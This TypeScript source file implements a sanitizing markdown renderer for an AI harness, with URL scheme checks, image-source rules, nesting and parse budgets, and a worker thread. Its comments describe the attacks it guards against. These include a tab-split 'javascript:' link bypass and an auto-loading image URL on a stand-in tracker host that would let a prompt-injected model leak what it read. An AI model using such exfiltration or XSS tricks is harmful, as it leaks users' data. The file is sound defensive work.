import { createHash } from 'node:crypto'
import { isAbsolute, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { isMainThread, parentPort, Worker, workerData } from 'node:worker_threads'

import { Marked, type Tokens } from 'marked'

import { highlightCode } from './highlight.ts'
import { sanitizeHtml } from './sanitize.ts'

/**
 * Markdown rendering, on **marked**.
 *
 * The first version of this file was a renderer written here. It was replaced on the owner's instruction on
 * 2026-10-11 — find an existing library with few dependencies and high function rather than writing one — and the
 * instruction was right on the evidence:
 *
 * - `marked` 18.1.0 has **zero dependencies** and 520 KB on disk, against four runtime dependencies for the whole
 *   harness, and a few times that size for `markdown-it`, `micromark` or `remark` once their trees are counted;
 * - it is maintained, and it renders constructs mine did not: nested lists, tables with alignment, autolinks,
 *   reference links, strikethrough, task lists, and the rest of GitHub-flavoured markdown.
 *
 * What it does **not** do is make any of that safe, and that is why this file still exists. `marked` documents
 * that it "does not sanitize the output HTML", and a document here is untrusted text — from a model, a repository,
 * or a person. So the two guarantees the written renderer had are kept here, and **the unit tests that assert them
 * are unchanged**: they were the acceptance test for adopting a library rather than something to relax for one.
 *
 * 1. **The library's output is reduced to an allow-list of elements and attributes**, so a document cannot produce
 *    a tag of its own. Measured: escaping the *source* first was wrong — `marked` escapes the escaped text again
 *    inside a code block, so `1 < 2` in a fence rendered as `&amp;lt;`. The guarantee belongs on the output when
 *    the parser is someone else's code, and it is an allow-list rather than a deny-list because a deny-list is a
 *    list of the attacks its author thought of.
 * 2. **A link's scheme is checked** in the renderer's own hook. Measured: `marked` emits `href="javascript:…"`
 *    without complaint, so the check has to be here.
 */

/** Escape the five characters that can start a tag, an entity, or a quote break-out. */
export function escapeHtml(text: string): string {
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;')
}

/**
 * Whether a link's target may be followed.
 *
 * Relative targets, fragments, and the three schemes a document legitimately links to are allowed; everything else
 * becomes text. A renderer that passes a `javascript:` URL through hands a document the ability to run code, and
 * "the browser decides" is not a defence — the browser follows what it is given.
 */
export function safeUrl(url: string): string | null {
  /**
   * Judged as a browser's URL parser reads it (WHATWG URL), which trims C0 controls and spaces at both ends and drops
   * tab and newline **wherever they are**. So the ends are trimmed of both those and white space, and a URL still
   * holding a tab, newline or carriage return is refused: `java<TAB>script:` had no scheme to the pattern below and
   * passed as a relative path, while the browser followed `javascript:` (live issue developer-two-6). A URL meant
   * literally never holds those characters raw. The Rust `safe_url` decides the same.
   */
  const trimmed = String(url ?? '').replace(/^[\u0000-\u0020\s]+|[\u0000-\u0020\s]+$/g, '')
  if (trimmed.length === 0 || /[\t\n\r]/.test(trimmed)) return null
  if (/^[a-z][a-z0-9+.-]*:/i.test(trimmed)) {
    return /^(?:https?|mailto):/i.test(trimmed) ? trimmed : null
  }
  return trimmed
}

/**
 * Where an embedded subresource should be fetched from.
 *
 * A document's relative reference — `![icon](heddle.svg)` — means *beside this document*, and a browser resolves it
 * against the **page URL** instead, which is the server root. Measured: that request answered `404`, so a document
 * with an image in it showed alt text and a broken marker. The reference is therefore resolved against the
 * document's own folder and handed to the route that serves a file's bytes.
 *
 * A remote URL is left exactly as written: it is the author's choice, it is not this server's to re-host, and
 * `safeUrl` has already refused the schemes that would run code. A `data:` image is not a file at all, so it is
 * refused here — the alternative is a document smuggling an arbitrary payload into the page.
 */
interface ResolvedSubresource {
  /** The file this reference names, as an absolute path. */
  readonly path: string
  /** The `#part` of the reference, without its `#`, or an empty string. */
  readonly fragment: string
}

/**
 * The file a relative subresource names, or `null` when the reference is not this server's to resolve.
 *
 * The return is two named pieces rather than one assembled string, and that is a correction: the first version
 * returned a `data-heddle-path=…` fragment for a link and then took it apart again with a **slice whose length was
 * the attribute name's** — so a raw HTML `<a href="README.md">` came out as
 * `href="data-heddle-path=%2FUsers…"`, a link to nowhere. Two pieces cannot be mis-split, and the caller builds the
 * markup it needs.
 */
function resolveSubresource(href: string, base: string | undefined): ResolvedSubresource | null {
  const trimmed = href.trim()
  if (trimmed.length === 0) return null
  /** A remote URL is the author's choice and is left exactly as written. */
  if (/^(?:https?:)?\/\//i.test(trimmed)) return null
  /** A `data:` image is a payload rather than a file, and a document that can embed one can smuggle one. */
  if (trimmed.startsWith('data:')) return null
  /** A fragment inside this document is not a file to look for beside it. */
  if (trimmed.startsWith('#')) return null
  if (base === undefined) return null
  const [target, fragment] = splitFragment(trimmed)
  const path = decodeLocalPath(target)
  if (path === null) return null
  return { path: isAbsolute(path) ? path : resolve(base, path), fragment }
}

/**
 * Decode an authored local path exactly once before joining and rawUrl's transport encoding (#131).
 * DSH sidebar-documentpreview markdownImageUrl likewise decodes before joining. Malformed escapes or UTF-8
 * and decoded schemes are refused, never partially decoded or recursively interpreted; fragments stay separate.
 */
function decodeLocalPath(path: string): string | null {
  try {
    const decoded = decodeURIComponent(path)
    return /^[a-z][a-z0-9+.-]*:/i.test(decoded) ? null : decoded
  } catch {
    return null
  }
}

/** The route that serves a file's bytes, which is what an `<img>` and a followed link both need. */
function rawUrl(resolved: ResolvedSubresource): string {
  return `/api/raw?path=${encodeURIComponent(resolved.path)}${resolved.fragment.length > 0 ? `#${resolved.fragment}` : ''}`
}

/** A URL split at its `#`, which a browser treats as a place inside the document rather than part of its name. */
function splitFragment(url: string): [string, string] {
  const at = url.indexOf('#')
  return at === -1 ? [url, ''] : [url.slice(0, at), url.slice(at + 1)]
}

/** The attribute a link carries the file it names in, so the page can open it instead of navigating away. */
export const LINK_DATA_ATTRIBUTE = 'data-heddle-path'

/**
 * The parser, configured once.
 *
 * `gfm` stays on because it is the dialect a document in a repository is written in. `breaks` stays **off**: one
 * newline inside a paragraph is a space in that dialect, and turning it on reflows every wrapped line of prose
 * into its own line.
 */
const marked = new Marked({ gfm: true, breaks: false })

/**
 * The folder a document's relative images resolve against, for the parse in progress.
 *
 * One module-level value rather than a closure per document, because `marked`'s renderer hooks cannot be handed
 * per-call state: the parse is synchronous and single-threaded, so this is set immediately before a parse and read
 * during it. The setter below is the only writer.
 */
let imageBase: string | undefined

/**
 * Whether an image may come from another host, for the parse in progress: a document's preview (`remoteImages`) keeps
 * the author's remote image as written; an answer does not. Set beside `imageBase`, by the same two entry points.
 */
let remoteImagesAllowed = false

/**
 * Where an image is fetched from, or `null` when it is not fetched at all (the image becomes its alt text).
 *
 * A document's preview resolves a relative image beside the document and leaves a remote one as written. An **answer**
 * shows only local files, as DSH's `localPathMediaUrl` does ("undefined for unsupported protocols and non-local
 * paths"): an absolute path goes to the route that serves a file's bytes, and a remote, protocol-relative or unresolvable
 * source is not fetched. Before this an answer's `![x](https://tracker.example/p.png?d=…)` was fetched by the browser the
 * moment the answer was drawn, with no click, so a model led by a hostile file could send out what it had read; and
 * `![x](/api/sessions)` made the page request an API of the answer's choosing (live issue developer-two-7, 2026-10-29).
 */
function imageSource(target: string): string | null {
  /**
   * Already the route that serves a file's bytes: the renderer above wrote it, and the sanitizer hands it back here as
   * a raw `<img>`. It is a local file either way, so it is kept rather than wrapped a second time.
   */
  if (target.startsWith('/api/raw?')) return target
  const resolved = resolveSubresource(target, imageBase)
  if (resolved !== null) return rawUrl(resolved)
  /** Validate local paths even without a base; remote addresses remain exactly as written. */
  const remote = /^[a-z][a-z0-9+.-]*:/i.test(target) || target.startsWith('//')
  const [path, fragment] = splitFragment(target)
  const decoded = remote ? null : decodeLocalPath(path)
  if (!remote && decoded === null) return null
  if (remoteImagesAllowed) return target
  if (path.startsWith('/') && !path.startsWith('//') && decoded !== null) return rawUrl({ path: decoded, fragment })
  return null
}

/**
 * The deepest container nesting one line may open: markdown-it's default `maxNesting`.
 *
 * Live issues developer-two-15 (P0) and -16 (2026-10-29): a line of 5,000 `>` overflowed the Rust renderer's stack and
 * aborted the server, again on every open of the session whose answer held it; this build answered from about 2,000
 * levels with `marked`'s own "Maximum call stack size exceeded", so the session view and the file preview failed. A
 * container nested this deep carries nothing a reader can follow, so the levels past it are rendered as their text.
 */
export const MAX_NESTING = 100

/**
 * Each line opens at most `MAX_NESTING` containers (block quotes and list items); a marker past that is escaped, so it
 * reads as its own character. **Every** line is bounded, code included, and the Rust `bound_nesting` writes the same.
 *
 * Indentation is bounded too (`boundIndent`). A first version skipped the lines of a code fence by its own fence test, which was looser than CommonMark's: `    ```
 * ` (four spaces, an indented code block) and `` ``` a`b `` (a backtick in a backtick fence's info string, a paragraph)
 * opened a "fence" for it but not for the parser, so every later line reached the parser unbounded (developer-three's
 * review, 2026-10-30). Bounding code too fails safe; a line of real code with more than a hundred nested markers, which
 * nobody writes, shows one backslash.
 */
export function boundNesting(markdown: string): string {
  return markdown.split('\n').map((line) => boundLine(boundIndent(line))).join('\n')
}

/**
 * The widest indentation a line keeps, in columns (a tab reaching the next multiple of four): two for each level of
 * `MAX_NESTING`, the least a nested list item indents by.
 *
 * Lists also nest by indentation, one marker per line, which counting markers does not see (developer-three's review
 * material): an indented list of 1,000 levels, about 1 MB, took 2 s and 386 MB in `marked`, and 1,500 levels ran this
 * build out of heap, which no catch survives. A line indented past this is drawn at this indentation.
 */
export const MAX_INDENT = 2 * MAX_NESTING

function boundIndent(line: string): string {
  let at = 0
  let column = 0
  while (line[at] === ' ' || line[at] === '\t') {
    column = line[at] === '\t' ? column + 4 - (column % 4) : column + 1
    at += 1
  }
  return column > MAX_INDENT ? `${' '.repeat(MAX_INDENT)}${line.slice(at)}` : line
}

/** A list item's marker at a given index: a bullet, or a number of up to nine digits and its `.` or `)`. */
const LIST_MARKER = /(?:[-+*]|\d{1,9}[.)])(?=[ \t]|$)/y

function boundLine(line: string): string {
  let at = 0
  let depth = 0
  for (;;) {
    while (line[at] === ' ' || line[at] === '\t') at += 1
    if (line[at] === '>') {
      depth += 1
      if (depth > MAX_NESTING) return `${line.slice(0, at)}\\${line.slice(at)}`
      at += 1
      continue
    }
    LIST_MARKER.lastIndex = at
    const list = LIST_MARKER.exec(line)
    if (list === null) return line
    depth += 1
    if (depth > MAX_NESTING) {
      /** A bullet is escaped itself; a number keeps its digits and escapes its `.` or `)`. */
      const escapeAt = /\d/.test(line[at] ?? '') ? at + list[0].length - 1 : at
      return `${line.slice(0, escapeAt)}\\${line.slice(escapeAt)}`
    }
    at += list[0].length
  }
}

/**
 * What a text that could not be rendered is shown as: its own words, escaped, so nothing is lost and nothing runs.
 *
 * The last guard behind `boundNesting`: a structure it does not bound (deep inline nesting) can still exhaust the
 * parser's stack, and in JavaScript that is a `RangeError` this build can catch, where it used to fail the whole
 * session view (live issue developer-two-16).
 */
/**
 * Conservative parser work budget, shared with Rust. Recursive inline parsing can exhaust a stack or heap before
 * an exception is recoverable. Over-budget documents remain readable as escaped original text, without parsing.
 * Count syntax even in code: recognizing code first would itself require trusting a parser on hostile input.
 */
export const MAX_PARSE_BYTES = 64 * 1024
export const MAX_INLINE_MARKERS = 512
export function withinParseBudget(text: string): boolean {
  if (text.length > MAX_PARSE_BYTES || Buffer.byteLength(text, 'utf8') > MAX_PARSE_BYTES) return false
  let markers = 0
  for (const character of text) {
    if ('*_[]`~'.includes(character) && ++markers > MAX_INLINE_MARKERS) return false
  }
  return true
}

function unrendered(text: string): string {
  return `<pre class="unrendered"><code>${escapeHtml(text)}</code></pre>`
}

/**
 * A leading `_` is escaped, so a name is a name.
 *
 * Measured, and it is a defect this repository hits everywhere: `# _tools_` rendered as `<em>tools</em>`, so the
 * folder names this project is made of — `_tools_`, `_verifiers_`, `_context_`, `_projects_` — **lost their
 * underscores** in every document that named one. `snake_case` inside a word survives, because that case flanks a
 * word on both sides; a lone `_name_` does not, and CommonMark's rule about intraword underscores says nothing
 * about a name standing alone.
 *
 * The escape is markdown's own: a backslash makes the character literal, which is what a document that wanted a
 * literal underscore would have written. Asterisks still make emphasis, so `*italics*` and `**bold**` are
 * unaffected — only the leading `_` of an underscore-run is touched, and `_` is still allowed to mean `_` in the
 * middle of a word, which is where it was already safe.
 */
function escapeLeadingUnderscores(markdown: string): string {
  /**
   * Code is left alone, because a backslash **inside code is visible** — measured: a fence containing `_a_b_`
   * rendered as `\_a_b_`, and an escape that changes the text of code is worse than the emphasis it prevents. Code
   * spans keep their underscores without help, since emphasis does not run inside them.
   */
  const lines = markdown.split('\n')
  const out: string[] = []
  let fence: string | null = null
  for (const line of lines) {
    const marker = /^\s*(```|~~~)/.exec(line)
    if (marker !== null) {
      const character = marker[1] ?? '```'
      if (fence === null) fence = character
      else if (fence === character) fence = null
      out.push(line)
      continue
    }
    if (fence !== null) {
      out.push(line)
      continue
    }
    /** A code span is `...`; the escape is applied to the parts that are not inside one. */
    out.push(
      line
        .split(/(`[^`]*`)/)
        .map((piece) => (piece.startsWith('`') ? piece : piece.replace(/(^|\s)_(?=[^\s_])/g, '$1\\_')))
        .join(''),
    )
  }
  return out.join('\n')
}

/**
 * Colour the code, in the renderer's `code` hook.
 *
 * A fence keeps its language while the highlighter colours it: `class="language-ts"` on the `<code>`, and the
 * highlighter's own `hljs-` spans inside. The allow-list accepts both because it permits `span`, `class` and `pre`,
 * and nothing else the highlighter could emit.
 *
 * This was `marked-highlight`, and the markup below is that plugin's, byte for byte. It is not the plugin any more
 * because the plugin colours code from a **`walkTokens`** hook, and registering any `walkTokens` makes `marked` walk
 * every token of every document with `values = values.concat(...)` — one copy of the whole result per token, which
 * is quadratic in a long list, a table, or a paragraph of many escapes (issue #19). Measured: a 30,000-item list
 * took 5.4 s to render (79% of the time in that walk, 16% collecting what it copied) and takes 0.13 s with this hook;
 * a 30,000-row table went from 3.2 s to 0.34 s. The `code` hook colours the same fences without the walk, and the
 * output of every tracked markdown file in the repository is unchanged by the swap.
 */
marked.use({
  renderer: {
    code({ text, lang, escaped }: Tokens.Code): string {
      const language = (lang ?? '').match(/\S*/)?.[0] ?? ''
      const coloured = highlightCode(text, language)
      const changed = typeof coloured === 'string' && coloured !== text
      const code = (changed ? coloured : text).replace(/\n$/, '')
      const classAttr = language.length > 0 ? ` class="language-${escapeHtml(language)}"` : ''
      return `<pre><code${classAttr}>${changed || escaped ? code : escapeHtml(code)}\n</code></pre>`
    },
  },
})

/**
 * The two renderer hooks that exist for safety, rather than for formatting.
 *
 * Both passed the label's **raw text** through at first, and that was a measured bug: a code span inside link text
 * rendered its backticks literally, so `[`x`](a.md)` — the shape this repository's index tables are full of — came
 * out as an anchor containing a backtick instead of a `code` element. `tokens` is what the parser already decided
 * the label means, and `this.parser` writes it exactly as it would be written outside a link, so emphasis and code
 * spans behave the same in both places. A label whose scheme is refused keeps its text, with the reason beside it,
 * so a reader who saw a link in the source sees what became of it.
 */
marked.use({
  renderer: {
    link(this: { parser: { parseInline(tokens: unknown[]): string } }, { href, title, tokens }: Tokens.Link): string {
      const label = this.parser.parseInline(tokens as unknown[])
      const target = safeUrl(href)
      if (target === null) return `${label} (link refused)`
      const heading = title === null || title === undefined ? '' : ` title="${escapeHtml(title)}"`
      const resolved = resolveSubresource(target, imageBase)
      /**
       * A link to a file in the workspace keeps its `href` as the **raw** address, so the status bar and a
       * middle-click both still point somewhere real, and carries the absolute path in an attribute so a plain click
       * opens it in this panel instead of navigating the page to a path the server does not serve. Measured before
       * this: `[x](DEPLOY.md)` asked for `/DEPLOY.md`, which answered `404`, and the reader lost the page they were
       * reading. A remote link is untouched and opens in a new tab.
       */
      if (resolved !== null) {
        return `<a href="${escapeHtml(rawUrl(resolved))}" ${LINK_DATA_ATTRIBUTE}="${escapeHtml(resolved.path)}"${heading}>${label}</a>`
      }
      const external = /^(?:https?:)?\/\//i.test(target)
      return `<a href="${escapeHtml(target)}"${external ? ' target="_blank"' : ''} rel="noreferrer noopener"${heading}>${label}</a>`
    },
    /** An image with a refused source becomes its alt text, so nothing is fetched and nothing is lost. */
    image(this: { parser: { parseInline(tokens: unknown[]): string } }, { href, title, text, tokens }: Tokens.Image): string {
      const label = tokens === undefined ? escapeHtml(text) : this.parser.parseInline(tokens as unknown[])
      const target = safeUrl(href)
      if (target === null) return label
      /** The base is set per parse, so one document's relative images do not resolve against another's. */
      const source = imageSource(target)
      if (source === null) return label
      const heading = title === null || title === undefined ? '' : ` title="${escapeHtml(title)}"`
      return `<img src="${escapeHtml(source)}" alt="${escapeHtml(text)}"${heading}>`
    },
  },
})

/**
 * Render inline spans only — a title, a table cell, a label.
 *
 * The library's own inline parser, which is part of the point of using it: one implementation of emphasis and
 * code spans rather than two that can disagree.
 */
export function renderInline(text: string): string {
  /** An inline span is never a document's preview: its images follow an answer's rule, whatever parsed last. */
  imageBase = undefined
  remoteImagesAllowed = false
  if (!withinParseBudget(String(text ?? ''))) return escapeHtml(String(text ?? ''))
  try {
    return sanitizeHtml(marked.parseInline(escapeLeadingUnderscores(boundNesting(String(text ?? '')))) as string, {
      url: (value, at) => {
        const safe = safeUrl(value)
        return safe !== null && at.tag === 'img' ? imageSource(safe) : safe
      },
    })
  } catch {
    return escapeHtml(String(text ?? ''))
  }
}

/**
 * Render a document to HTML.
 *
 * A leading YAML block is lifted out and shown as metadata rather than parsed: every document in this repository
 * opens with frontmatter, and as markdown it renders as a horizontal rule and a heading made of the first key.
 */
export function renderMarkdown(source: string, options: { readonly base?: string; readonly remoteImages?: boolean } = {}): string {
  imageBase = options.base
  /** Only a document's preview asks for remote images; an answer, which has no `base`, never does. */
  remoteImagesAllowed = options.remoteImages === true
  const text = String(source ?? '').replace(/\r\n?/g, '\n')
  if (!withinParseBudget(text)) return unrendered(text)
  const front = /^---\n([\s\S]*?)\n---\n?/.exec(text)
  const body = front === null ? text : text.slice(front[0].length)
  const frontHtml =
    front === null
      ? ''
      : `<section class="frontmatter"><h2>frontmatter</h2><pre><code>${escapeHtml((front[1] ?? '').trim())}</code></pre></section>\n`
  let parsed: string
  try {
    parsed = marked.parse(escapeLeadingUnderscores(boundNesting(body))) as string
  } catch {
    return unrendered(text)
  }
  return sanitizeHtml(frontHtml + parsed, {
    /**
     * One rule for a subresource, **wherever the tag came from**.
     *
     * The renderer above handles what `marked` produces. Raw HTML goes around that renderer, so an `<img>` or an `<a>`
     * written by hand would otherwise keep a relative address the browser resolves against the page URL — which is the
     * server root, and measured as a `404`. The callback is handed the tag and the attribute, so both are resolved by
     * the same function the renderer uses: an image to the route that serves bytes, and a link to the attribute the
     * panel follows.
     */
    url: (value, at) => {
      const safe = safeUrl(value)
      if (safe === null) return null
      /** Hand-written images share Markdown's local-path decoding and remote policy. */
      if (at.tag === 'img') return imageSource(safe)
      /** A reference with a scheme, or one already absolute, is not a file beside the document. */
      const relative = !/^[a-z][a-z0-9+.-]*:/i.test(safe) && !safe.startsWith('/') && !safe.startsWith('#')
      if (!relative) return safe
      const resolved = resolveSubresource(safe, imageBase)
      if (resolved === null) return safe
      /**
       * A raw HTML link arrives here rather than at the renderer, because `marked` passes an HTML block straight
       * through — so a hand-written `<a href="README.md">` gets the served address from this callback. The path for
       * the page to follow rides in that address (see the page's click handler), since an attribute cannot be added
       * from inside a callback that answers for one attribute's value.
       */
      return rawUrl(resolved)
    },
  })
}

/**
 * How long one document may take to render before its text is answered instead.
 *
 * `marked`'s emphasis scan is quadratic in the delimiters of one paragraph — measured, 30,000 words of the shape `*n`
 * took 80 s — and that is in the library, not in anything this file configures. The parse budget above
 * ({@link withinParseBudget}, 64 KiB and 512 inline markers) now keeps such a document from reaching `marked` at all,
 * but a document inside it still costs real time, and a session holds many: measured on main with that budget, a
 * session of eight 62 KB lists stood the event loop still for 2.7 s when a page opened it. A time budget is the bound
 * that holds for every input: a document that needs longer than this is shown as the text it is (see
 * {@link markdownFallback}), and a normal one renders well inside it (a 9,000-item list, near the parse budget, takes
 * about 40 ms).
 */
export const MARKDOWN_RENDER_BUDGET_MS = 3_000

/**
 * What a document that could not be rendered in its budget is shown as: the same block as one past the parse budget
 * ({@link unrendered}), its own text escaped, so a page tells both apart from a rendered answer in one way.
 */
export function markdownFallback(source: string): string {
  return unrendered(String(source ?? ''))
}

/** How many recent documents a renderer remembers the answer to. */
const RECENT_DOCUMENTS = 32

/** The role a worker is started with, so this module serves renders only in a worker it started itself. */
const WORKER_ROLE = 'heddle-markdown-renderer'

/** What {@link renderMarkdown} is told about a document, carried to the worker whole so the two cannot drift apart. */
type RenderOptions = NonNullable<Parameters<typeof renderMarkdown>[1]>

interface RenderJob {
  readonly id: number
  readonly source: string
  readonly options: RenderOptions
}

/**
 * A worker of this module's own: it renders what it is sent and answers with the HTML.
 *
 * The module is its own worker entry, so the worker runs exactly the renderer configured above — the same parser,
 * hooks and allow-list — and `import.meta.url` names the right file whether this runs from `src/` or `dist/`.
 */
if (!isMainThread && parentPort !== null && (workerData as { role?: unknown } | null)?.role === WORKER_ROLE) {
  const port = parentPort
  port.on('message', (job: RenderJob) => {
    try {
      port.postMessage({ id: job.id, html: renderMarkdown(job.source, job.options) })
    } catch (error) {
      port.postMessage({ id: job.id, error: error instanceof Error ? error.message : String(error) })
    }
  })
  port.postMessage({ ready: true })
}

/**
 * Markdown rendered **off the server's event loop**, one document at a time, each within a budget (issue #19).
 *
 * The server used to call {@link renderMarkdown} inside its request handlers. A Node server has one thread for every
 * request, stream and probe, so a document that took seconds to render stopped all of them for those seconds:
 * measured on a scratch server, opening a session that held one 30,000-item list answer stood the event loop still
 * for 7 s, the stream of another session's turn stopped for 7 s, and `/healthz` missed probes in a row — the
 * supervisor's rule for "hung", which then kills the process and every turn on it. DSH never has this failure
 * because its host does not render an answer at all; the browser does (`AssistantMarkdown`, which draws each block
 * with `MarkdownText`, in `dsh-client-ui-chat`). Heddle keeps rendering on the server, where its allow-list is, and
 * moves the work to a worker thread instead, so the event loop only posts the text and receives the HTML.
 *
 * A render that outlives its budget is ended by terminating the worker — a synchronous parse cannot be interrupted
 * any other way — and the document is answered as its own text; the next document gets a fresh worker. Documents
 * wait their turn rather than sharing one worker's time, so each budget is spent on its own document. If no worker
 * can be started at all, rendering falls back to this thread rather than to no rendering, which is the old cost and
 * not a new failure.
 */
export class MarkdownWorker {
  private readonly budgetMs: number
  private worker: Worker | undefined
  private ready = false
  private unavailable = false
  private nextId = 1
  private readonly queue: { job: RenderJob; settle: (html: string) => void }[] = []
  /**
   * The last documents asked for, by content, and their answers (pending or settled).
   *
   * Every page that follows a session asks for the same answer when a turn ends, so one document arrives once per
   * follower within a second; rendering it once and handing every follower that result is what keeps a document
   * that spends its whole budget from spending it again per page.
   */
  private readonly recent = new Map<string, Promise<string>>()
  private current: { job: RenderJob; settle: (html: string) => void; timer: ReturnType<typeof setTimeout> | undefined } | undefined

  constructor(options: { readonly budgetMs?: number } = {}) {
    this.budgetMs = options.budgetMs ?? MARKDOWN_RENDER_BUDGET_MS
  }

  /** Render one document; resolves with its HTML, or with its text as a block when the budget ran out. Never rejects. */
  render(source: string, options: RenderOptions = {}): Promise<string> {
    const text = String(source ?? '')
    if (this.unavailable) return Promise.resolve(renderMarkdown(text, options))
    /** Options JSON cannot write (a BigInt, a cycle) only cost the document its place in the cache, never a throw. */
    let key: string | undefined
    try {
      key = createHash('sha256').update(JSON.stringify(options)).update('\u0000').update(text).digest('hex')
    } catch {
      key = undefined
    }
    const known = key === undefined ? undefined : this.recent.get(key)
    if (known !== undefined) return known
    const answer = new Promise<string>((settle) => {
      this.queue.push({ job: { id: this.nextId++, source: text, options: { ...options } }, settle })
      this.pump()
    })
    if (key === undefined) return answer
    this.recent.set(key, answer)
    if (this.recent.size > RECENT_DOCUMENTS) this.recent.delete(this.recent.keys().next().value as string)
    return answer
  }

  /** Stop the worker; documents still waiting are answered as their text. */
  async close(): Promise<void> {
    this.recent.clear()
    const pending = [...this.queue.splice(0), ...(this.current !== undefined ? [this.current] : [])]
    if (this.current?.timer !== undefined) clearTimeout(this.current.timer)
    this.current = undefined
    for (const entry of pending) entry.settle(markdownFallback(entry.job.source))
    const worker = this.worker
    this.worker = undefined
    this.ready = false
    if (worker !== undefined) await worker.terminate()
  }

  /** Start the next document when the worker is idle and ready, starting a worker when there is none. */
  private pump(): void {
    if (this.current !== undefined) return
    const next = this.queue[0]
    if (next === undefined) {
      this.worker?.unref()
      return
    }
    if (this.worker === undefined) {
      this.start()
      return
    }
    if (!this.ready) return
    this.queue.shift()
    this.worker.ref()
    const timer = setTimeout(() => this.expire(), this.budgetMs)
    this.current = { ...next, timer }
    try {
      this.worker.postMessage(next.job)
    } catch {
      /**
       * A job the worker cannot be sent — a DataCloneError, for an option that does not survive structured clone — is
       * answered as its text and the queue goes on. Thrown from here it escaped as an uncaught exception from the
       * worker's message listener, or as a rejection from render's executor, and render promises neither.
       */
      clearTimeout(timer)
      this.current = undefined
      next.settle(markdownFallback(next.job.source))
      this.pump()
    }
  }

  private start(): void {
    let worker: Worker
    try {
      worker = new Worker(fileURLToPath(import.meta.url), { workerData: { role: WORKER_ROLE } })
    } catch {
      this.giveUp()
      return
    }
    this.worker = worker
    this.ready = false
    worker.on('message', (message: { ready?: boolean; id?: number; html?: string; error?: string }) => {
      if (worker !== this.worker) return
      if (message.ready === true) {
        this.ready = true
        this.pump()
        return
      }
      const current = this.current
      if (current === undefined || message.id !== current.job.id) return
      if (current.timer !== undefined) clearTimeout(current.timer)
      this.current = undefined
      current.settle(typeof message.html === 'string' ? message.html : markdownFallback(current.job.source))
      this.pump()
    })
    /** A worker that dies answers its document as text; one that never became ready means workers are unusable here. */
    const lost = (): void => {
      if (worker !== this.worker) return
      const wasReady = this.ready
      this.worker = undefined
      this.ready = false
      const current = this.current
      this.current = undefined
      if (current !== undefined) {
        if (current.timer !== undefined) clearTimeout(current.timer)
        current.settle(markdownFallback(current.job.source))
      }
      if (!wasReady) this.giveUp()
      else this.pump()
    }
    worker.on('error', lost)
    worker.on('exit', lost)
  }

  /** The budget ran out: end the worker mid-parse, answer the document as text, and go on with a fresh one. */
  private expire(): void {
    const current = this.current
    const worker = this.worker
    if (current === undefined || worker === undefined) return
    this.current = undefined
    this.worker = undefined
    this.ready = false
    current.settle(markdownFallback(current.job.source))
    void worker.terminate()
    this.pump()
  }

  /** No worker can run here: render on this thread from now on, the old behaviour, rather than not at all. */
  private giveUp(): void {
    this.unavailable = true
    for (const entry of this.queue.splice(0)) entry.settle(renderMarkdown(entry.job.source, entry.job.options))
  }
}

/** The server's renderer, started on first use. */
let shared: MarkdownWorker | undefined

/**
 * Render a document without blocking the event loop — what a request handler calls instead of {@link renderMarkdown}.
 *
 * Same output as `renderMarkdown` for every document that renders within {@link MARKDOWN_RENDER_BUDGET_MS}; past it,
 * {@link markdownFallback}. The synchronous function stays for callers that are not serving anyone.
 */
export function renderMarkdownOffThread(source: string, options: RenderOptions = {}): Promise<string> {
  shared ??= new MarkdownWorker()
  return shared.render(source, options)
}
